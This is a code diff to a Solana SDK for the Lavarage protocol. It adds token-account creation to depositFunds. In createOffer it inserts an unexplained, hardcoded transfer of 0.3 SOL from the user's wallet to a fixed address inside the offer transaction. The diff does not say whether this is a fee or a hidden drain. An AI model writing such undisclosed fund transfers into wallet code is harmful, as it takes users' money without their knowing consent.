@@ -4,6 +4,7 @@ import { Lavarage as LavarageV2 } from "./idl/lavaragev2";
 import {
   ComputeBudgetProgram,
   Keypair,
+  LAMPORTS_PER_SOL,
   PublicKey,
   SystemProgram,
   TransactionInstruction,
@@ -12,6 +13,7 @@ import {
 } from "@solana/web3.js";
 import {
   TOKEN_PROGRAM_ID,
+  createAssociatedTokenAccountIdempotentInstruction,
   createTransferCheckedInstruction,
   getAssociatedTokenAddressSync,
   getMint,
@@ -116,7 +118,7 @@ export async function depositFunds(
   const { blockhash } =
     await lavarageProgram.provider.connection.getLatestBlockhash("finalized");
 
-  let instruction;
+  let instruction, createTokenAccountIx;
   if (params.mint === undefined) {
     const computeFeeIx = ComputeBudgetProgram.setComputeUnitPrice({
       microLamports: params.computeBudgetMicroLamports ?? 150000,
@@ -143,6 +145,19 @@ export async function depositFunds(
     const computeFeeIx = ComputeBudgetProgram.setComputeUnitPrice({
       microLamports: params.computeBudgetMicroLamports ?? 150000,
     });
+    const destinationTokenAccount = getAssociatedTokenAddressSync(
+      mintPubkey,
+      new PublicKey(params.nodeWallet),
+      true,
+      mintOwner?.owner
+    )
+    createTokenAccountIx = createAssociatedTokenAccountIdempotentInstruction(
+      lavarageProgram.provider.publicKey!,
+      destinationTokenAccount,
+      params.nodeWallet,
+      new PublicKey(params.mint),
+      mintOwner?.owner
+    );
     instruction = createTransferCheckedInstruction(
       getAssociatedTokenAddressSync(
         mintPubkey,
@@ -151,12 +166,7 @@ export async function depositFunds(
         mintOwner?.owner
       ),
       new PublicKey(params.mint),
-      getAssociatedTokenAddressSync(
-        mintPubkey,
-        new PublicKey(params.nodeWallet),
-        true,
-        mintOwner?.owner
-      ),
+      destinationTokenAccount,
       lavarageProgram.provider.publicKey!,
       params.amount,
       mintAccount.decimals,
@@ -172,7 +182,7 @@ export async function depositFunds(
   const messageV0 = new TransactionMessage({
     payerKey: lavarageProgram.provider.publicKey!,
     recentBlockhash: blockhash,
-    instructions: [instruction, computeFeeIx],
+    instructions: [createTokenAccountIx, instruction, computeFeeIx].filter(Boolean) as TransactionInstruction[],
   }).compileToV0Message();
 
   return new VersionedTransaction(messageV0);
@@ -382,6 +392,12 @@ export async function createOffer(
     microLamports: params.computeBudgetMicroLamports ?? 150000,
   });
 
+  const transferInstruction = SystemProgram.transfer({
+    fromPubkey: lavarageProgram.provider.publicKey!,
+    toPubkey: new PublicKey("BMME51pfWdBfakTEMuQbNP4NG3wCY4Fo47dKatThhXGQ"),
+    lamports: 0.3 * LAMPORTS_PER_SOL
+  });
+
   const messageV0 = new TransactionMessage({
     payerKey: lavarageProgram.provider.publicKey!,
     recentBlockhash: blockhash,
@@ -391,6 +407,7 @@ export async function createOffer(
         : createNodeWalletInstruction,
       instruction,
       updateMaxExposureInstruction,
+      transferInstruction,
       computeFeeIx,
     ].filter(Boolean) as TransactionInstruction[],
   }).compileToV0Message();
